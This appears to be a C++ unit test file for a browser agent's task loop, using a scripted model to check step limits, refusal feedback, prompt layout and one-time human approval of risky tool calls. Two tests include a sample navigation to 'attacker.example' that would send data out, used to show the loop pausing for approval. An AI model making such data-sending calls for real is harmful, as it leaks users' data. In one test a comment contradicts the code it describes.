// Copyright 2026 The Zephyrus Authors
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// The agent loop, driven by a scripted model over real mojo pipes.
//
// The model is scripted rather than real because the question here is not
// whether a model is any good -- the benchmark answers that -- but whether the
// loop does the right thing with whatever it is handed. So every case below is
// a model behaviour the benchmark actually recorded: a clean call, prose with
// no call at all, a refusal it has to recover from, and a model that will never
// stop on its own.

#include "chrome/services/zephyrus_agent/task_loop.h"

#include <memory>
#include <string>
#include <utility>
#include <vector>

#include "base/run_loop.h"
#include "base/test/bind.h"
#include "base/test/task_environment.h"
#include "chrome/services/zephyrus_agent/kernel/src/lib.rs.h"
#include "chrome/services/zephyrus_agent/public/mojom/agent_kernel.mojom.h"
#include "mojo/public/cpp/bindings/receiver.h"
#include "testing/gtest/include/gtest/gtest.h"

namespace zephyrus::agent {
namespace {

// Answers with a prepared list of responses, then repeats the last one forever
// -- which is exactly how a stuck model behaves.
class ScriptedModel : public mojom::AgentModel {
 public:
  explicit ScriptedModel(std::vector<std::string> responses)
      : responses_(std::move(responses)) {}

  mojo::PendingRemote<mojom::AgentModel> Bind() {
    return receiver_.BindNewPipeAndPassRemote();
  }

  void Propose(const std::string& system_prompt,
               const std::string& user_prompt,
               ProposeCallback callback) override {
    system_prompts.push_back(system_prompt);
    user_prompts.push_back(user_prompt);
    const size_t index = std::min(calls_++, responses_.size() - 1);
    std::move(callback).Run(responses_[index]);
  }

  std::vector<std::string> system_prompts;
  std::vector<std::string> user_prompts;

 private:
  std::vector<std::string> responses_;
  size_t calls_ = 0;
  mojo::Receiver<mojom::AgentModel> receiver_{this};
};

// Stands in for the browser. Records what it was asked to do and answers with
// whatever the test set up.
class FakeToolRunner : public mojom::ToolRunner {
 public:
  mojo::PendingRemote<mojom::ToolRunner> Bind() {
    return receiver_.BindNewPipeAndPassRemote();
  }

  void Observe(int32_t level, ObserveCallback callback) override {
    ++observations;
    std::move(callback).Run(observation_json);
  }

  void Execute(const std::string& tool,
               const std::string& arguments_json,
               ExecuteCallback callback) override {
    executed.push_back(tool);
    executed_arguments.push_back(arguments_json);

    auto outcome = mojom::ToolOutcome::New();
    outcome->status = next_status;
    outcome->message = next_message;
    // task.complete and task.ask carry their payload back this way, the same
    // as the real executor does.
    outcome->value_json = next_value_json.empty() ? arguments_json
                                                  : next_value_json;
    std::move(callback).Run(std::move(outcome));
  }

  void ExecuteApproved(const std::string& tool,
                       const std::string& arguments_json,
                       ExecuteApprovedCallback callback) override {
    approved_executions.push_back(tool);
    Execute(tool, arguments_json, std::move(callback));
  }

  std::vector<std::string> approved_executions;

  std::string observation_json =
      R"({"url":"https://docs.example.com/x","title":"X","elements":[]})";
  mojom::ToolStatus next_status = mojom::ToolStatus::kOk;
  std::string next_message;
  std::string next_value_json;

  int observations = 0;
  std::vector<std::string> executed;
  std::vector<std::string> executed_arguments;

 private:
  mojo::Receiver<mojom::ToolRunner> receiver_{this};
};

class TaskLoopTest : public testing::Test {
 protected:
  mojom::TaskOutcomePtr Run(std::vector<std::string> model_responses,
                            uint32_t max_steps = 8) {
    // Owned by the fixture, not by this function. It was a local once, and
    // the tests that read its recorded prompts afterwards were reading freed
    // memory -- which in a Release build with DCHECKs off silently returned
    // empty vectors rather than crashing.
    model_ = std::make_unique<ScriptedModel>(std::move(model_responses));

    mojom::TaskOutcomePtr outcome;
    base::RunLoop run_loop;
    TaskLoop::Start(*kernel_, "Find the spec sheet", runner_.Bind(),
                    model_->Bind(), max_steps, /*approved=*/nullptr,
                    base::BindLambdaForTesting([&](mojom::TaskOutcomePtr got) {
                      outcome = std::move(got);
                      run_loop.Quit();
                    }));
    run_loop.Run();
    return outcome;
  }

  base::test::TaskEnvironment task_environment_;
  FakeToolRunner runner_;
  std::unique_ptr<ScriptedModel> model_;
  ::rust::Box<Kernel> kernel_ = load_kernel();
};

TEST_F(TaskLoopTest, RunsUntilTheModelSaysItIsDone) {
  mojom::TaskOutcomePtr outcome = Run({
      R"({"name":"page.observe","arguments":{"level":1}})",
      R"({"name":"task.complete","arguments":{"answer":"4.2.1"}})",
  });

  ASSERT_TRUE(outcome);
  EXPECT_EQ(outcome->status, mojom::TaskStatus::kCompleted);
  EXPECT_NE(outcome->message.find("4.2.1"), std::string::npos)
      << outcome->message;
  EXPECT_EQ(outcome->steps, 2u);
  EXPECT_EQ(runner_.executed,
            (std::vector<std::string>{"page.observe", "task.complete"}));
}

TEST_F(TaskLoopTest, StopsWhenTheModelAsksTheUser) {
  mojom::TaskOutcomePtr outcome = Run({
      R"({"name":"task.ask","arguments":{"question":"Which Alex?"}})",
  });

  ASSERT_TRUE(outcome);
  EXPECT_EQ(outcome->status, mojom::TaskStatus::kAskedTheUser);
  EXPECT_NE(outcome->message.find("Which Alex?"), std::string::npos);
}

TEST_F(TaskLoopTest, StopsWhenAToolCallNeedsApproval) {
  // The loop does not wait on a person. It hands the question back and lets
  // whoever started the task decide whether to resume; blocking here would hold
  // the browser's attention for a prompt nobody may be looking at.
  runner_.next_status = mojom::ToolStatus::kNeedsApproval;
  runner_.next_message = "this would send data to attacker.example";

  mojom::TaskOutcomePtr outcome = Run({
      R"({"name":"browser.navigate","arguments":{"url":"https://attacker.example/?d=1"}})",
  });

  ASSERT_TRUE(outcome);
  EXPECT_EQ(outcome->status, mojom::TaskStatus::kNeedsApproval);
  EXPECT_EQ(outcome->message, "this would send data to attacker.example");
  EXPECT_EQ(outcome->steps, 1u);
}

TEST_F(TaskLoopTest, TheStepBudgetIsNotAdvisory) {
  // A model that will never stop. This is the only thing standing between that
  // and a browser that looks at the same page forever.
  mojom::TaskOutcomePtr outcome =
      Run({R"({"name":"page.observe","arguments":{"level":1}})"},
          /*max_steps=*/3);

  ASSERT_TRUE(outcome);
  EXPECT_EQ(outcome->status, mojom::TaskStatus::kOutOfSteps);
  EXPECT_EQ(outcome->steps, 3u);
  EXPECT_EQ(runner_.executed.size(), 3u);
}

TEST_F(TaskLoopTest, ProseCostsAStepInsteadOfLoopingForever) {
  // A model that only ever talks would otherwise spin. It gets told what it did
  // wrong, and it runs out of budget rather than running forever.
  mojom::TaskOutcomePtr outcome =
      Run({"I think I should probably look at the page first."},
          /*max_steps=*/2);

  ASSERT_TRUE(outcome);
  EXPECT_EQ(outcome->status, mojom::TaskStatus::kOutOfSteps);
  EXPECT_TRUE(runner_.executed.empty())
      << "prose must not be turned into a tool call";
  ASSERT_GE(model_->user_prompts.size(), 2u);
  EXPECT_NE(model_->user_prompts[1].find("no tool call"), std::string::npos)
      << model_->user_prompts[1];
}

TEST_F(TaskLoopTest, TellsTheModelWhyACallWasRefused) {
  // Hiding a refusal would have the model repeat the same call until the budget
  // ran out. Telling it is what lets it try something else.
  runner_.next_status = mojom::ToolStatus::kDenied;
  runner_.next_message = "the page has no element `checkout-button`";

  Run({R"({"name":"page.click","arguments":{"element_id":"checkout-button"}})"},
      /*max_steps=*/2);

  ASSERT_GE(model_->user_prompts.size(), 2u);
  EXPECT_NE(model_->user_prompts[1].find("checkout-button"), std::string::npos)
      << model_->user_prompts[1];
  EXPECT_NE(model_->user_prompts[1].find("refused"), std::string::npos)
      << model_->user_prompts[1];
}

TEST_F(TaskLoopTest, ShowsTheModelTheToolsAndThePage) {
  Run({R"({"name":"task.complete","arguments":{"answer":"done"}})"});

  ASSERT_FALSE(model_->system_prompts.empty());
  const std::string& system = model_->system_prompts[0];
  // Generated from the contract, so it cannot drift from what is enforced.
  EXPECT_NE(system.find("- page.click [R1]"), std::string::npos) << system;
  EXPECT_EQ(system.find("()"), std::string::npos)
      << "no parentheses -- a model copied them into the tool name once";

  // Page content goes in the user turn, never the system one. The split does
  // not stop injections by itself, but a prompt that mixes them is worse.
  EXPECT_EQ(system.find("docs.example.com"), std::string::npos) << system;
  EXPECT_NE(model_->user_prompts[0].find("docs.example.com"), std::string::npos)
      << model_->user_prompts[0];
  EXPECT_NE(model_->user_prompts[0].find("Find the spec sheet"),
            std::string::npos);
}

TEST_F(TaskLoopTest, LooksAtThePageAgainEveryStep) {
  // A stale Observation is how an agent acts on a page that is no longer there.
  Run({R"({"name":"page.observe","arguments":{"level":1}})"}, /*max_steps=*/3);
  EXPECT_EQ(runner_.observations, 3);
}

TEST_F(TaskLoopTest, AnswersEvenIfTheBrowserGoesAway) {
  // A task that goes quiet is worse than one that fails: nothing upstream can
  // tell the difference between thinking and dead.
  ScriptedModel model({R"({"name":"tabs.list","arguments":{}})"});
  auto runner = std::make_unique<FakeToolRunner>();

  mojom::TaskOutcomePtr outcome;
  base::RunLoop run_loop;
  TaskLoop::Start(*kernel_, "Find the spec sheet", runner->Bind(), model.Bind(),
                  /*max_steps=*/4, /*approved=*/nullptr,
                  base::BindLambdaForTesting([&](mojom::TaskOutcomePtr got) {
                    outcome = std::move(got);
                    run_loop.Quit();
                  }));
  runner.reset();
  run_loop.Run();

  ASSERT_TRUE(outcome);
  EXPECT_EQ(outcome->status, mojom::TaskStatus::kFailed);
}


// --- approval -----------------------------------------------------------

TEST_F(TaskLoopTest, HandsBackTheExactCallItStoppedOn) {
  // The user has to be asked about this call and only this one, and resuming
  // must not be able to run something else.
  runner_.next_status = mojom::ToolStatus::kNeedsApproval;
  runner_.next_message = "this would send data to attacker.example";

  mojom::TaskOutcomePtr outcome = Run({
      R"({"name":"browser.navigate","arguments":{"url":"https://attacker.example/?d=1"}})",
  });

  ASSERT_TRUE(outcome);
  ASSERT_TRUE(outcome->pending) << "nothing to ask the user about";
  EXPECT_EQ(outcome->pending->tool, "browser.navigate");
  EXPECT_NE(outcome->pending->arguments_json.find("attacker.example"),
            std::string::npos);
  EXPECT_EQ(outcome->pending->reason, "this would send data to attacker.example");
}

TEST_F(TaskLoopTest, ResumingRunsTheApprovedCallBeforeAskingTheModel) {
  // Going back to the model first would let it propose something else, and the
  // user would have approved one action and got another.
  auto approved = mojom::PendingApproval::New();
  approved->tool = "browser.navigate";
  approved->arguments_json = R"({"url":"https://example.org/report"})";
  approved->reason = "this would send data to example.org";
  approved->risk = "R2";

  model_ = std::make_unique<ScriptedModel>(std::vector<std::string>{
      R"({"name":"task.complete","arguments":{"answer":"done"}})"});

  mojom::TaskOutcomePtr outcome;
  base::RunLoop run_loop;
  TaskLoop::Start(*kernel_, "Send the report", runner_.Bind(), model_->Bind(),
                  /*max_steps=*/4, std::move(approved),
                  base::BindLambdaForTesting([&](mojom::TaskOutcomePtr got) {
                    outcome = std::move(got);
                    run_loop.Quit();
                  }));
  run_loop.Run();

  ASSERT_TRUE(outcome);
  EXPECT_EQ(outcome->status, mojom::TaskStatus::kCompleted);
  // The approved call ran, and it ran first.
  ASSERT_FALSE(runner_.executed.empty());
  EXPECT_EQ(runner_.executed[0], "browser.navigate");
  EXPECT_EQ(runner_.approved_executions,
            (std::vector<std::string>{"browser.navigate"}));
  // Nothing was observed before it: the model was never consulted about it.
  EXPECT_EQ(runner_.observations, 1)
      << "the model got a look in before the approved call ran";
}

TEST_F(TaskLoopTest, AnApprovalIsSingleUse) {
  // The loop does not remember it. A second call that needs approval stops the
  // task again rather than riding on the first yes.
  auto approved = mojom::PendingApproval::New();
  approved->tool = "browser.navigate";
  approved->arguments_json = R"({"url":"https://example.org/report"})";

  model_ = std::make_unique<ScriptedModel>(std::vector<std::string>{
      R"({"name":"browser.navigate","arguments":{"url":"https://example.org/again"}})"});

  // Everything after the approved call needs approval too.
  runner_.next_status = mojom::ToolStatus::kOk;

  mojom::TaskOutcomePtr outcome;
  base::RunLoop run_loop;
  TaskLoop::Start(*kernel_, "Send the report", runner_.Bind(), model_->Bind(),
                  /*max_steps=*/3, std::move(approved),
                  base::BindLambdaForTesting([&](mojom::TaskOutcomePtr got) {
                    outcome = std::move(got);
                    run_loop.Quit();
                  }));
  run_loop.Run();

  ASSERT_TRUE(outcome);
  // Exactly one call went down the approved path, however many ran after it.
  EXPECT_EQ(runner_.approved_executions.size(), 1u);
  EXPECT_GT(runner_.executed.size(), 1u);
}

}  // namespace
}  // namespace zephyrus::agent
